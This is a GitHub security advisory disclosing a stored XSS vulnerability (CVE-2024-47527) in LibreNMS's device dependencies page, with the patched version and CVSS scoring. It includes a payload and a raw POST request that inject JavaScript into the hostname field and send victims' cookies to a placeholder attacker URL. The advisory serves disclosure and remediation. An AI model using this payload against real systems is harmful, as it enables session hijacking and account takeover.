
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flibrenms%2Flibrenms%2Fsecurity%2Fadvisories%2FGHSA-rwwc-2v8q-gc9v)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flibrenms%2Flibrenms%2Fsecurity%2Fadvisories%2FGHSA-rwwc-2v8q-gc9v)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=librenms%2Flibrenms)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[librenms](/librenms)
/
**[librenms](/librenms/librenms)**
Public

* [Notifications](/login?return_to=%2Flibrenms%2Flibrenms) You must be signed in to change notification settings
* [Fork
  2.3k](/login?return_to=%2Flibrenms%2Flibrenms)
* [Star
   4k](/login?return_to=%2Flibrenms%2Flibrenms)

* [Code](/librenms/librenms)
* [Issues
  158](/librenms/librenms/issues)
* [Pull requests
  96](/librenms/librenms/pulls)
* [Actions](/librenms/librenms/actions)
* [Projects
  1](/librenms/librenms/projects)
* [Security](/librenms/librenms/security)
* [Insights](/librenms/librenms/pulse)

Additional navigation options

* [Code](/librenms/librenms)
* [Issues](/librenms/librenms/issues)
* [Pull requests](/librenms/librenms/pulls)
* [Actions](/librenms/librenms/actions)
* [Projects](/librenms/librenms/projects)
* [Security](/librenms/librenms/security)
* [Insights](/librenms/librenms/pulse)

# Stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/device-dependencies.inc.php

High

[murrant](/murrant)
published
GHSA-rwwc-2v8q-gc9v
Oct 1, 2024

## Package

librenms/includes/html/pages/device-dependencies.inc.php
(LibreNMS)

## Affected versions

<= 24.7.0

## Patched versions

24.9.0

## Description

### Summary

A Stored Cross-Site Scripting (XSS) vulnerability in the "Device Dependencies" feature allows authenticated users to inject arbitrary JavaScript through the device name ("hostname" parameter). This vulnerability can lead to the execution of malicious code in the context of other users' sessions, potentially compromising their accounts and allowing unauthorized actions.

### Details

The vulnerability occurs when creating a device within LibreNMS. An attacker can inject arbitrary JavaScript into the hostname parameter. This malicious script is then executed when another user visits the device dependencies page, resulting in an automatic redirect to a website controlled by the attacker. This redirect can be used to steal session cookies or perform other malicious actions.

For example, the following payload can be used to exploit the vulnerability:

`t'' autofocus onfocus="document.location='https://<attacker_url>/?c='+document.cookie"`

When the device dependencies page is loaded, this payload triggers the JavaScript, causing the user's browser to redirect to the attacker's website with any non-httponly cookies in the URL.

The root cause of this vulnerability is the application's failure to sanitize the row.hostname value before including it in the HTML output.

This is evident in the following line of code:

[librenms/includes/html/pages/device-dependencies.inc.php](https://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/pages/device-dependencies.inc.php#L74)

Line 74
in
[9455173](/librenms/librenms/commit/9455173edce6971777cf6666d540eeeaf6201920)

|  | var response = "<button type='button' class='btn btn-primary btn-sm command-edit' aria-label='Edit' data-toggle='modal' data-target='#edit-dependency' data-device\_id='"+row.deviceid+"' data-host\_name='"+row.hostname+"' data-parent\_id='"+row.parentid+"' name='edit-host-dependency'><i class='fa fa-pencil' aria-hidden='true'></i></button> "; |
| --- | --- |

### PoC

1. Add a new device using the following payload for the hostname:

   `t'' autofocus onfocus="document.location='https://<attacker_url>/?c='+document.cookie"`
2. Save the device.
3. Navigate to the device dependencies page.
4. Observe that the injected script executes, redirecting the user to the attacker's website with any non-httponly cookies included in the URL.

Example Request:

```
POST /addhost HTTP/1.1
Host: <your_host>
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: <your_cookie>

_token=<your_token>&hostname=t%27%27+autofocus+onfocus%3D%22document.location%3D%27https%3A%2F%<attacker_url>%2F%3Fc%3D%27%2Bdocument.cookie%22&sysName=&hardware=&os=&os_id=&snmpver=v2c&port=&transport=udp&port_assoc_mode=ifIndex&community=&authlevel=noAuthNoPriv&authname=&authpass=&authalgo=SHA&cryptopass=&cryptoalgo=AES&force_add=on&Submit=
```
### Impact

It could allow authenticated users to execute arbitrary JavaScript code in the context of other users' sessions. Impacted users could have their accounts compromised, enabling the attacker to perform unauthorized actions on their behalf.

### Severity

High

7.5

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
High

User interaction
Required

Scope
Changed

Confidentiality
High

Integrity
Low

Availability
Low

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L

### CVE ID

CVE-2024-47527

### Weaknesses

[CWE-79](/advisories?query=cwe%3A79)

### Credits

* [![@RaphaelCSS](https://avatars.githubusercontent.com/u/85494741?s=40&v=4)](/RaphaelCSS)
  [RaphaelCSS](/RaphaelCSS)
  Reporter
* [![@RaphaelCSSilva](https://avatars.githubusercontent.com/u/20135953?s=40&v=4)](/RaphaelCSSilva)
  [RaphaelCSSilva](/RaphaelCSSilva)
  Finder

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

